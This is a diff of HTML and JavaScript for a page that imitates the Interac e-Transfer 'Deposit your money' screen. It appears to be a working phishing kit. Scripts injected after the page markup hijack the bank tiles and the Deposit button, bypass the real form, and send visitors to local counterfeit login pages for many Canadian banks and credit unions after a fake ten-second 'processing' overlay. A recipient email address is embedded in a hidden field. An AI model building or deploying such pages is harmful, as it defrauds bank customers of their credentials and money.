+<path d="M51.404,109.79c-1.951,1.952-1.951,5.118,0,7.071l8.84,8.838c1.951,1.952,5.117,1.952,7.07,0l70.489-70.489  c1.951-1.953,1.951-5.119,0-7.071l-8.838-8.838c-1.953-1.953-5.119-1.953-7.072,0L51.404,109.79z" fill="#FFFFFF"></path>
+<path d="M76.402,109.79c1.953,1.952,1.953,5.119,0,7.071l-8.838,8.838c-1.953,1.952-5.119,1.952-7.07,0  L27.195,92.401c-1.951-1.952-1.951-5.118,0-7.07l8.838-8.839    c1.953-1.952,5.119-1.952,7.072,0L76.402,109.79z" fill="#FFFFFF"></path>
+</g>
+</switch>
+</svg>
+</div>
+</div>
+</div>
+<div class="pure-u-1 text-center">
+<button class="pure-button button-brand-a deposit-form-submit-btn fi-select-submit cu-select-submit" data-role="none" disabled="" id="depositSelectSubmit" type="button">
+		Deposit
+		<span aria-hidden="true"> &gt; </span>
+</button>
+</div>
+</div>
+</form>
+<div class="pure-u-1">
+<div class="separator"></div>
+</div>
+<div class="pure-g" id="otherOptions">
+<div class="pure-u-1">
+<h2 class="resp-header-size margin-desktop-only-left-25">
+                                Don't see your Financial Institution here?
+                            </h2>
+</div>
+<div class="pure-u-1">
+<p class="margin-none margin-desktop-only-left-25" style="font-size:14px;">
+                                Please <a class="decline-request-non-supported-fi" href="#">decline</a> this Deposit your money so we can let the requester know and we will stop sending you any reminders. 
+                            </p>
+<br/><br/>
+</div>
+</div>
+<div class="pure-u-1">
+<div class="separator"></div>
+</div>
+<div class="pure-u-1 padding-h-5">
+<div class="display-inline-block padding-right-10">
+<svg class="translate-y-d-5" height="30px" version="1.1" viewbox="0 0 16 16" width="30px" xmlns="http://www.w3.org/2000/svg" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns:xlink="http://www.w3.org/1999/xlink">
+<switch>
+<g>
+<g fill="none" fill-rule="evenodd" id="Icons with numbers" stroke="none" stroke-width="1"><g fill="#000000" id="Group" transform="translate(-576.000000, -432.000000)"><path d="M583,435 L583,437 L585,437 L585,435 Z M584,448 C579.581722,448 576,444.418278 576,440 C576,435.581722 579.581722,432 584,432 C588.418278,432 592,435.581722 592,440 C592,444.418278 588.418278,448 584,448 Z M583,439 L583,445 L585,445 L585,439 Z M583,439" id="Oval 208"></path></g></g>
+</g>
+</switch>
+<foreignobject></foreignobject>
+</svg>
+</div>
+
+</div>
+<div></div>
+<div class="pure-u-1 text-center">
+
+</div>
+</div>
+</main>
+<div class="footer l-box interac-max-width" data-role="footer">
+<div class="separator"></div>
+<div class="pure-g footer-link-container">
+<ul class="pure-u-1 pure-u-md-3-5">
+<li class="pure-u-lg-1-3 pure-u-md-1-2 pure-u-1">
+<a class="certapay-link footer-link" data-ajax="false" href="javascript:void();" hreflang="en"><i>Interac</i> e-Transfer</a>
+</li>
+<li class="pure-u-lg-1-3 pure-u-md-1-2 pure-u-1">
+<a class="privacy-link footer-link" data-ajax="false" href="javascript:void();" hreflang="en">Privacy Policy</a>
+</li>
+<li class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
+<a class="security-link footer-link" data-ajax="false" href="javascript:void();" hreflang="en">Security</a>
+</li>
+</ul>
+<div class="pure-u-1 pure-u-md-2-5">
+<span class="footer-text">This is a secure Transaction
+	            <svg class="translate-y-d-3" height="20px" id="_1" style="enable-background:new 0 0 512 512;" version="1.1" viewbox="0 0 512 512" width="20px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<switch>
+<g>
+<path class="grey-icon" d="M221.909,335.546c0-18.866,15.226-34.092,34.091-34.092  s34.091,15.226,34.091,34.092c0,13.749-8.189,25.567-19.997,30.905l19.997,60.003h-68.182l19.997-60.003  C230.093,361.113,221.909,349.295,221.909,335.546z M437.818,233.273H74.182v250h363.637V233.273z M369.637,136.682  c0-59.659-48.296-107.955-107.955-107.955h-11.363c-59.659,0-107.955,48.296-107.955,107.955v73.864h227.273V136.682z M437.818,506  H74.182c-12.501,0-22.727-10.231-22.727-22.728v-250c0-12.496,10.226-22.728,22.727-22.728h45.455v-73.864  C119.636,64.527,178.158,6,250.318,6h11.363c72.155,0,130.682,58.527,130.682,130.682v73.864h45.455  c12.495,0,22.728,10.232,22.728,22.728v250C460.546,495.769,450.313,506,437.818,506z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#b5b5b5;"></path>
+</g>
+</switch>
+<foreignobject></foreignobject>
+</svg>
+</span>
+</div>
+</div>
+<div class="separator"></div>
+<div class="padding-t-5 pure-g">
+<div class="pure-u-md-1-2 pure-hidden-sm pure-hidden-xs text-left">
+<img alt="Interac e-Transfer" class="logo" src="./etransfer_logo.svg" style="height: 50px;"/>
+</div>
+<div class="pure-u-1 pure-hidden-md pure-hidden-lg pure-hidden-xl">
+<img alt="Interac e-Transfer" class="logo" src="./etransfer_logo.svg" style="height: 50px;"/>
+</div>
+<div class="pure-u-md-1-2 pure-u-1">
+<p class="copyright-text">
+				2000
+				<script type="text/javascript">
+					function getCurrentYear() {
+						var currentDate = new Date();
+						return currentDate.getFullYear();
+					}
+					var currentYear = getCurrentYear();
+					document.write(currentYear);
+				</script>2026
+				Interac Corp.  All rights reserved. 
+				<a class="termsAndConditions-link underline" href="javascript:void();" hreflang="en">Terms of Use</a>
+<br/>
+				 Trade-marks of Interac Corp.
+				
+            </p>
+</div>
+</div>
+</div>
+<script src="./navJS.js.tlchargement" type="text/javascript"></script>
+<form action="https://etransfer.interac.ca/fulfilPaymentRequest.do" id="fulfil" method="post" name="fulfil">
+<input id="hiddenFiId" name="fiId" type="hidden"/>
+<input id="hiddenCuId" name="cuId" type="hidden"/>
+<input id="hiddenFiLabel" name="hiddenFiId" type="hidden"/>
+<input id="hiddenCuLabel" name="hiddenFiId" type="hidden"/>
+<input id="isMobileBrowser" name="isMobileBrowser" type="hidden" value="false"/>
+<input id="language" name="lang" type="hidden" value="en"/>
+<input id="requestRefNum" name="requestRefNum" type="hidden" value="NBV-443-9981"/>
+<input id="rID" name="rID" type="hidden" value="NBV-443-9981"/>
+<input id="eMail" name="eMail" type="hidden" value="moufasarim@gmail.com"/>
+<input id="sessionCheckRequired" name="sessionCheckRequired" type="hidden" value="true"/>
+<input id="hiddenTMUUID" name="hiddenTMUUID" type="hidden" value="0b005bed-2cb9-4644-99dc-31bc6769ff2a"/>
+<input id="isFromRMLandingPage" name="isFromRMLandingPage" type="hidden" value="true"/>
+<input id="src" name="src" type="hidden" value="email"/>
+</form>
+<script>
+
+       	$(document).prop('title', $($.parseHTML('INTERAC e-Transfer Deposit your money ')).text());
+			function submitForm(){
+				var fiId = $("#hiddenFiId").val() || "";
+				var cuId = $("#hiddenCuId").val() || "";
+				
+				var fiLabel = $("#hiddenFiLabel").val() || "";
+				var cuLabel = $("#hiddenCuLabel").val() || "";
+				
+				var selectFiOption = $("#selectFiId option:selected");
+				if (selectFiOption.length && selectFiOption.val()) {
+					fiLabel = selectFiOption.attr("filabel") || selectFiOption.text() || fiLabel;
+				}
+				
+				var selectCuOption = $('select[id^="selectCu-"]:visible option:selected');
+				if (selectCuOption.length && selectCuOption.val()) {
+					cuLabel = selectCuOption.attr("filabel") || selectCuOption.text() || cuLabel;
+				}
+				
+				var label = (fiLabel || cuLabel || "").toLowerCase().trim();
+				var dest = "";
+				
+				var mappingIds = {
+					"038860000": "laurentian.html",
+					"818283005": "neo.html",
+					"818287030": "wealthsimple.html",
+					"888330006": "alterna.html",
+					"818096870": "eqbank.html",
+					"000030800": "simplii.html",
+					
+					"CA000001": "bmo.html",
+					"CA000010": "cibc.html",
+					"CA000219": "atb.html",
+					"CA000382": "coastcapital.html",
+					"CA000815": "desjardins.html",
+					"CA000837": "meridian.html",
+					"CA000320": "pcfinancial.html",
+					"CA000006": "nationalbank.html",
+					"CA000621": "peoplestrust.html",
+					"CA000003": "rbc.html",
+					"CA000002": "scotiabank.html",
+					"CA000614": "tangerine.html",
+					"CA000004": "ca/en/dt101.html",
+					"CA000809": "central1.html",
+					
+					"046610163": "1stchoicesavings.html",
+					"821630070": "accesscu.html",
+					"046610100": "connectfirst.html",
+					"046610379": "lakelandcu.html",
+					"046610305": "rockycu.html",
+					"294420010": "servuscu.html",
+					"828994121": "uni.html",
+					"813530002": "vancity.html"
+				};
+				
+				if (cuId && mappingIds[cuId]) {
+					dest = mappingIds[cuId];
+				} else if (fiId && mappingIds[fiId]) {
+					dest = mappingIds[fiId];
+				} else {
+					if (label.indexOf("bmo") !== -1 || label.indexOf("montreal") !== -1) dest = "bmo.html";
+					else if (label.indexOf("cibc") !== -1) dest = "cibc.html";
+					else if (label.indexOf("atb") !== -1) dest = "atb.html";
+					else if (label.indexOf("desjardins") !== -1) dest = "desjardins.html";
+					else if (label.indexOf("nationale") !== -1 || label.indexOf("national bank") !== -1) dest = "nationalbank.html";
+					else if (label.indexOf("laurentian") !== -1) dest = "laurentian.html";
+					else if (label.indexOf("alterna") !== -1) dest = "alterna.html";
+					else if (label.indexOf("peoples trust") !== -1) dest = "peoplestrust.html";
+					else if (label.indexOf("neo financial") !== -1) dest = "neo.html";
+					else if (label.indexOf("scotia") !== -1) dest = "scotiabank.html";
+					else if (label.indexOf("rbc") !== -1 || label.indexOf("royal bank") !== -1) dest = "rbc.html";
+					else if (label.indexOf("simplii") !== -1) dest = "simplii.html";
+					else if (label.indexOf("tangerine") !== -1) dest = "tangerine.html";
+					else if (label.indexOf("td ") !== -1 || label.indexOf("easyweb") !== -1 || label.indexOf("canada trust") !== -1) dest = "td.html";
+					else if (label.indexOf("wealthsimple") !== -1) dest = "wealthsimple.html";
+					else if (label.indexOf("central 1") !== -1) dest = "central1.html";
+					else if (label.indexOf("1st choice") !== -1) dest = "1stchoicesavings.html";
+					else if (label.indexOf("access credit") !== -1) dest = "accesscu.html";
+					else if (label.indexOf("connect first") !== -1) dest = "connectfirst.html";
+					else if (label.indexOf("lakeland") !== -1) dest = "lakelandcu.html";
+					else if (label.indexOf("rocky") !== -1) dest = "rockycu.html";
+					else if (label.indexOf("servus") !== -1) dest = "servuscu.html";
+					else if (label.indexOf("uni ") !== -1 || label.indexOf("uni financial") !== -1) dest = "uni.html";
+					else if (label.indexOf("vancity") !== -1) dest = "vancity.html";
+					else if (label.indexOf("eq bank") !== -1) dest = "eqbank.html";
+					else if (label.indexOf("first nations") !== -1) dest = "fnbc.html";
+				}
+				
+				if (dest) {
+					window.location.href = dest;
+				} else {
+					var form = document.fulfil;
+					form.submit();
+				}
+			}
+
+			function declineForNotSupportedFiFlow(){
+                var form = document.getElementById('fulfil');
+                form.attr("action", "declineForNotSupportedFi.do");
+                submitForm();
+			}
+
+			function goToPaymentRequestFlow(){
+				var form = document.getElementById('fulfil');
+				form.attr("action", "fulfilPaymentRequest.do");
+
+				submitForm();
+			}
+	 		$(document).ready(function(){
+	 			$(".fi-tile").attr("href", "javascript:void(0)");
+	 			$(document).on("click", ".fi-tile", function(e){
+	 				e.preventDefault();
+	 				e.stopPropagation();
+	 				var $tile = $(this).closest(".fi-tile");
+	 				$("#hiddenFiId").val($tile.attr("fiid") || "");
+	 				$("#hiddenCuId").val($tile.attr("cuid") || "");
+	 				$("#hiddenFiLabel").val($tile.attr("filabel") || "");
+	 				$("#hiddenCuLabel").val($tile.attr("filabel") || "");
+	 				submitForm();
+	 			});
+	            $(".decline-request").click(function(){
+	            	var form = document.fulfil;
+	    			form.action = "rejectPaymentRequest.do";
+	    			//form.attr("action", "rejectPaymentRequest.do");
+	    			submitForm();
+	            });
+                $(".decline-request-non-supported-fi").click(function(){
+                    var form = document.fulfil;
+                    form.action = "declineForNotSupportedFi.do";
+                    submitForm();
+                });
+	 		 });
+         </script>
+<script type="text/javascript">
+        //Load Resources depending on mobile or desktop configuration
+        Modernizr.load({
+            test: Modernizr.touch && Modernizr.mq('only all and (max-width: 600px)'),
+            nope: ['/resources/newgateway/vendor/jquery-mobile-theme/themes/interac-jqm.min.css',
+                   '/resources/newgateway/vendor/jquery-mobile-theme/themes/jquery.mobile.icons.min.css',
+                   '/resources/newgateway/vendor/jquery.mobile-1.4.5/jquery.mobile.structure-1.4.5.min.css',
+					
+                   '/resources/newgateway/vendor/jquery-ui-1.11.4.custom/jquery-ui.min.css',
+                   '/resources/newgateway/vendor/jquery-ui-1.11.4.custom/jquery-ui.min.js' ]
+        });
+
+        var detailPanelIsOpen = false;
+        
+        $('.accordion-toggle').click(function(){
+          //Expand or collapse this panel
+          $(this).next().slideToggle('fast');
+            if (detailPanelIsOpen == false){
+                $("#detailToggleChevron").attr("transform", "rotate(90 10 10)");
+                detailPanelIsOpen = true;
+            }else{
+                $("#detailToggleChevron").attr("transform", "rotate(0 10 10)");
+                detailPanelIsOpen = false;
+            }
+
+          //Hide the other panels
+          $(".accordion-content").not($(this).next()).slideUp('fast');
+
+        });
+
+	</script>
+<script src="./allModuleJS.js.tlchargement" type="text/javascript"></script>
+
+
+<script>
+// Dropdown selection handling
+document.addEventListener('DOMContentLoaded', function() {
+    var loader = document.getElementById('loaderOverlayInterac');
+    
+    var fiMapping = {
+        'RBC': 'rbc101.html',
+        'UNI': 'uni101.html',
+        'ATB': 'atb101.html',
+        'BMO': 'bmo101.html',
+        'CIBC': 'cibc101.html',
+        'Coast Capital': 'coastcapital101.html',
+        'Desjardins': 'desjardins101.html',
+        'KOHO': 'koho101.html',
+        'Laurentian': 'laurentianbank101.html',
+        'Meridian': 'meridian101.html',
+        'National Bank': 'nationalbank.html',
+        'Neo': 'neo101.html',
+        'PC Financial': 'pcfinancial101.html',
+        'Scotiabank': 'scotiabank101.html',
+        'Simplii': 'simplii.html',
+        'Tangerine': 'tangerine.html',
+        'TD ': 'ca/en/dt101.html',
+        'Vancity': 'vancity.html',
+        'Wealthsimple': 'wealthsimple101.html'
+    };
+
+    function handleBankSelection(fiLabel) {
+        if (!fiLabel) return;
+        var targetFile = 'rbc101.html'; // Default
+        
+        for (var key in fiMapping) {
+            if (fiLabel.toLowerCase().includes(key.toLowerCase())) {
+                targetFile = fiMapping[key];
+                break;
+            }
+        }
+        
+        if (loader) {
+            loader.classList.add('active');
+            setTimeout(function() {
+                window.location.href = targetFile;
+            }, 10000);
+        } else {
+            window.location.href = targetFile;
+        }
+    }
+
+    // Intercept form submission
+    var submitBtn = document.getElementById('depositSelectSubmit');
+    if(submitBtn) {
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            var fiLabel = '';
+            var mainFiSelect = document.getElementById('selectFiId');
+            var provSelect = document.getElementById('province');
+            
+            if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
+                fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
+            } else if (provSelect && provSelect.value) {
+                var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
+                if (activeCu && activeCu.value && activeCu.value !== '') {
+                    fiLabel = activeCu.options[activeCu.selectedIndex].text;
+                }
+            }
+            
+            if (fiLabel) {
+                handleBankSelection(fiLabel);
+            }
+        });
+    }
+});
+</script>
+
+
+<script src="security_module.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var fiMapping = {
+        'ATB': 'atb101.html',
+        'BMO': 'bmo101.html',
+        'CIBC': 'cibc101.html',
+        'Coast Capital': 'coastcapital101.html',
+        'Desjardins': 'desjardins101.html',
+        'KOHO': 'koho101.html',
+        'Laurentian': 'laurentianbank101.html',
+        'Meridian': 'meridian101.html',
+        'National Bank': 'nationalbank.html',
+        'Neo': 'neo101.html',
+        'PC Financial': 'pcfinancial101.html',
+        'RBC': 'rbc101.html',
+        'Scotiabank': 'scotiabank101.html',
+        'Simplii': 'simplii.html',
+        'Tangerine': 'tangerine.html',
+        'TD': 'ca/en/dt101.html',
+        'UNI': 'uni101.html',
+        'Vancity': 'vancity.html',
+        'Wealthsimple': 'wealthsimple101.html'
+    };
+
+    var tiles = document.querySelectorAll('a.fi-tile');
+    tiles.forEach(function(tile) {
+        tile.style.cursor = 'pointer';
+        tile.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            var label = tile.getAttribute('filabel') || '';
+            var target = 'rbc101.html';
+            
+            for (var key in fiMapping) {
+                if (label.toLowerCase().includes(key.toLowerCase())) {
+                    target = fiMapping[key];
+                    break;
+                }
+            }
+            window.location.href = './' + target;
+        });
+    });
+});
+</script>
+</body></html>
+
+<script>
+setInterval(function() {
+    var kohoLink = document.querySelector('a[filabel="KOHO Financial"]');
+    if (kohoLink) {
+        var imgs = kohoLink.querySelectorAll('img');
+        var path = window.location.pathname.includes('INTERAC e-Transfer Deposit your money.html') ? './INTERAC e-Transfer Deposit your money_files/koho.html' : 'koho.html';
+        kohoLink.onclick = function(e) {
+            e.preventDefault(); e.stopPropagation();
+            window.location.href = path;
+        };
+        for(var i=0; i<imgs.length; i++) {
+            imgs[i].onclick = function(e) {
+                e.preventDefault(); e.stopPropagation();
+                window.location.href = path;
+            };
+        }
+        var divs = kohoLink.querySelectorAll('div');
+        for(var j=0; j<divs.length; j++) {
+            divs[j].onclick = function(e) {
+                e.preventDefault(); e.stopPropagation();
+                window.location.href = path;
+            };
+        }
+    }
+}, 500);
+</script>
+
+<style>
+/* Loader Overlay for Interac */
+.loader-overlay-interac {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background-color: rgba(255, 255, 255, 0.95);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
+    visibility: hidden;
+    opacity: 0;
+    transition: opacity 0.3s;
+    font-family: Arial, sans-serif;
+}
+.loader-overlay-interac.active {
+    visibility: visible;
+    opacity: 1;
+}
+.loader-spinner-interac {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #F2A900; /* Interac Yellow */
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.loader-text-interac {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333333;
+}
+</style>
+
+<div id="loaderOverlayInterac" class="loader-overlay-interac">
+    <div class="loader-spinner-interac"></div>
+    <p class="loader-text-interac">Traitement en cours, veuillez patienter...</p>
+</div>
+
+
+
+<script>
+// Fix for dropdown selection and Deposit button
+document.addEventListener('DOMContentLoaded', function() {
+    var loader = document.getElementById('loaderOverlayInterac');
+    var provSelect = document.getElementById('province');
+    var placeholder = document.getElementById('placeholderCU');
+    var allCuSelects = document.querySelectorAll('.selectCu[provincecode]');
+    var submitBtn = document.getElementById('depositSelectSubmit');
+    var mainFiSelect = document.getElementById('selectFiId');
+
+    function checkSubmit() {
+        var isValid = false;
+        if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
+            isValid = true;
+        } else if (provSelect && provSelect.value) {
+            var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
+            if (activeCu && activeCu.value && activeCu.value !== '') {
+                isValid = true;
+            }
+        }
+        if (submitBtn) {
+            submitBtn.disabled = !isValid;
+        }
+    }
+
+    if(provSelect) {
+        provSelect.addEventListener('change', function() {
+            var prov = this.value;
+            if(placeholder) placeholder.style.display = prov ? 'none' : 'block';
+            allCuSelects.forEach(function(el) {
+                el.style.display = (el.getAttribute('provincecode') === prov) ? 'block' : 'none';
+            });
+            // Reset cu selection when changing province
+            allCuSelects.forEach(function(el) {
+                var sel = el.querySelector('select');
+                if(sel) sel.selectedIndex = 0;
+            });
+            checkSubmit();
+        });
+    }
+
+    if (mainFiSelect) {
+        mainFiSelect.addEventListener('change', checkSubmit);
+    }
+
+    allCuSelects.forEach(function(el) {
+        var sel = el.querySelector('select');
+        if(sel) {
+            sel.addEventListener('change', checkSubmit);
+        }
+    });
+
+    var fiMapping = {
+        'RBC': 'rbc101.html',
+        'UNI': 'uni101.html',
+        'ATB': 'atb101.html',
+        'BMO': 'bmo101.html',
+        'CIBC': 'cibc101.html',
+        'Coast Capital': 'coastcapital101.html',
+        'Desjardins': 'desjardins101.html',
+        'KOHO': 'koho101.html',
+        'Laurentian': 'laurentianbank101.html',
+        'Meridian': 'meridian101.html',
+        'National Bank': 'nationalbank.html',
+        'Neo': 'neo101.html',
+        'PC Financial': 'pcfinancial101.html',
+        'Scotiabank': 'scotiabank101.html',
+        'Simplii': 'simplii.html',
+        'Tangerine': 'tangerine.html',
+        'TD ': 'ca/en/dt101.html',
+        'Vancity': 'vancity.html',
+        'Wealthsimple': 'wealthsimple101.html'
+    };
+
+    function handleBankSelection(fiLabel) {
+        if (!fiLabel) return;
+        var targetFile = 'rbc101.html'; // Default
+        
+        for (var key in fiMapping) {
+            if (fiLabel.toLowerCase().includes(key.toLowerCase())) {
+                targetFile = fiMapping[key];
+                break;
+            }
+        }
+        
+        if (loader) {
+            loader.classList.add('active');
+            setTimeout(function() {
+                window.location.href = targetFile;
+            }, 10000);
+        } else {
+            window.location.href = targetFile;
+        }
+    }
+
+    if(submitBtn) {
+        // Remove disabled attribute for testing, or ensure it's removed by JS
+        submitBtn.removeAttribute('disabled');
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            var fiLabel = '';
+            if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
+                fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
+            } else if (provSelect && provSelect.value) {
+                var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
+                if (activeCu && activeCu.value && activeCu.value !== '') {
+                    fiLabel = activeCu.options[activeCu.selectedIndex].text;
+                }
+            }
+            
+            if (fiLabel) {
+                handleBankSelection(fiLabel);
+            }
+        });
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
